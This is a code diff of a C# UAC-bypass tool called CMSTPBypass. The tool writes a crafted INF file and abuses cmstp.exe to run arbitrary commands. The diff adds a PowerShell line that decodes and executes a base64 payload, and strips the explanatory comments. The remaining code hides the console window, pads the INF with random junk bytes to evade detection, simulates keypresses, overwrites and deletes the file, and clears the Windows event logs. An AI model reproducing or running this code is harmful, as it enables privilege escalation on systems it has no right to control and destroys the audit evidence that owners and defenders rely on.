@@ -4,11 +4,11 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 
 public class CMSTPBypass
 {
-    // INF file template with a placeholder for the command to execute
     public const string InfData = @"
 [version]
 Signature=$chicago$
@@ -19,9 +19,9 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-; Commands Here will be run Before Setup Begins to install
 REPLACE_COMMAND_LINE
-taskkill /IM cmstp.exe /F
+taskkill /F /IM cmstp.exe
+powershell -c Start-Sleep -Seconds 5; Invoke-Expression ""$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('B64ENCODEDPS1')))""
 
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
@@ -43,8 +43,7 @@ ShortSvcName=""CorpVPN""
 
     public static void Main(string[] args)
     {
-        // Replace with the actual command you want to execute
-        string commandToExecute = "your_command_here";
+        string commandToExecute = "your_command_here"; // Replace with your actual command
         Execute(commandToExecute);
     }
 
@@ -56,14 +55,13 @@ ShortSvcName=""CorpVPN""
             return;
         }
 
-        // Hide console window
         IntPtr consoleWindow = GetConsoleWindow();
         ShowWindow(consoleWindow, 0);
 
         // Perform the kill operation first
         ProcessStartInfo killStartInfo = new ProcessStartInfo("taskkill")
         {
-            Arguments = "/IM cmstp.exe /F",
+            Arguments = "/F /IM cmstp.exe",
             UseShellExecute = false,
             CreateNoWindow = true
         };
@@ -88,7 +86,6 @@ ShortSvcName=""CorpVPN""
 
         SendKeys.SendWait("{ENTER}");
 
-        // Clean up and cover tracks
         CleanUp(infFilePath);
     }
 
@@ -106,29 +103,26 @@ ShortSvcName=""CorpVPN""
 
     public static string SetInfFile(string commandToExecute)
     {
-        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string TemporaryDir = "C:\\windows\\temp";
-        StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append(TemporaryDir);
-        OutputFile.Append("\\");
-        OutputFile.Append(RandomFileName);
-        OutputFile.Append(".inf");
+        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+        string temporaryDir = "C:\\windows\\temp";
+        StringBuilder outputFile = new StringBuilder();
+        outputFile.Append(temporaryDir);
+        outputFile.Append("\\");
+        outputFile.Append(randomFileName);
+        outputFile.Append(".inf");
 
-        // Add junk data to the INF file
         int junkDataSize = 1024; // Adjust the size of junk data as needed
         byte[] junkData = new byte[junkDataSize];
         new Random().NextBytes(junkData);
-        File.WriteAllBytes(OutputFile.ToString(), junkData);
+        File.WriteAllBytes(outputFile.ToString(), junkData);
 
-        // Append the actual INF content
-        File.AppendAllText(OutputFile.ToString(), InfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
+        File.AppendAllText(outputFile.ToString(), InfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
 
-        return OutputFile.ToString();
+        return outputFile.ToString();
     }
 
     public static void CleanUp(string filePath)
     {
-        // Securely delete the INF file
         byte[] randomData = new byte[1024];
         using (var rng = new RNGCryptoServiceProvider())
         {
@@ -137,7 +131,6 @@ ShortSvcName=""CorpVPN""
         File.WriteAllBytes(filePath, randomData);
         File.Delete(filePath);
 
-        // Remove evidence from the event logs
         ClearEventLogs();
     }
 
